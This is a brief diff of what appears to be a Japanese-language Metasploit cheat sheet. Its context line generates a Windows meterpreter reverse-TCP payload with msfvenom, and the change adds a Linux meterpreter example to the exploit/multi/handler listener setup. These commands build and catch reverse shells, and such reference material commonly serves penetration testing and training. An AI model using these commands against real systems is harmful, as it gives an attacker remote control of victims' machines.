@@ -235,7 +235,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Numbe
 #### Handlers
 ```
 use exploit/multi/handler
-set payload <payload>   (set payload windows/meterpreter/reverse_tcp など)
+set payload <payload>   (set payload windows/meterpreter/reverse_tcp、　set payload linux/x86/meterpreter/reverse_tcp など)
 set LHOST <ip address>
 set LPORT <port number>
 run
